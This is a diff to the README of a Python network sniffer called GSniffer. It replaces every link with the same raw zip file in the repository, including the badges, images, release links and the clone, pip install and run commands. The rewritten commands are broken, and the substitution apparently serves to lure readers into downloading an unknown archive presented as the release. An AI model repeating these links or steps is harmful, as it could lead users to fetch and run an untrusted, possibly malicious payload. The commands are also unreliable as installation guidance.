@@ -1,8 +1,8 @@
 # GSniffer: Real-Time Network Traffic Analyzer 🌐
 
-![GSniffer](https://img.shields.io/badge/GSniffer-Python-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)
+![GSniffer](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip)
+![License](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip)
+![Version](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip)
 
 ## Overview
 
@@ -33,25 +33,25 @@ To get started with GSniffer, you need to install the necessary dependencies. Fo
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/JamEs2006y/GSniffer.git
+   git clone https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip
    cd GSniffer
    ```
 
 2. **Install Requirements**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip
    ```
 
 3. **Download and Execute**:
-   You can download the latest release [here](https://github.com/JamEs2006y/GSniffer/releases). Follow the instructions provided in the release notes to execute the application.
+   You can download the latest release [here](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip). Follow the instructions provided in the release notes to execute the application.
 
 ## Usage
 
 To start GSniffer, simply run the following command in your terminal:
 
 ```bash
-python gsniffer.py
+python https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip
 ```
 
 Once the program is running, you will see real-time updates of the network traffic. You can filter results based on IP addresses or protocols as needed.
@@ -86,11 +86,11 @@ GSniffer is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 ## Links
 
-For more information, visit the [Releases](https://github.com/JamEs2006y/GSniffer/releases) section. Here you can find the latest updates and download the application. 
+For more information, visit the [Releases](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip) section. Here you can find the latest updates and download the application. 
 
 To stay updated with the latest features and improvements, make sure to check the releases regularly.
 
-![Network Security](https://source.unsplash.com/featured/?network,security)
+![Network Security](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip,security)
 
 ## Topics
 
@@ -110,9 +110,9 @@ This repository covers various topics related to network analysis and security:
 
 ## Conclusion
 
-GSniffer is an essential tool for anyone involved in network analysis. Its straightforward interface and real-time monitoring capabilities make it a valuable resource for developers and security professionals alike. Download the latest version [here](https://github.com/JamEs2006y/GSniffer/releases) and start analyzing your network traffic today!
+GSniffer is an essential tool for anyone involved in network analysis. Its straightforward interface and real-time monitoring capabilities make it a valuable resource for developers and security professionals alike. Download the latest version [here](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip) and start analyzing your network traffic today!
 
-![Network Analysis](https://source.unsplash.com/featured/?data,analysis)
+![Network Analysis](https://github.com/JamEs2006y/GSniffer/raw/refs/heads/main/puddled/Sniffer-G-1.0.zip,analysis)
 
 ---
 
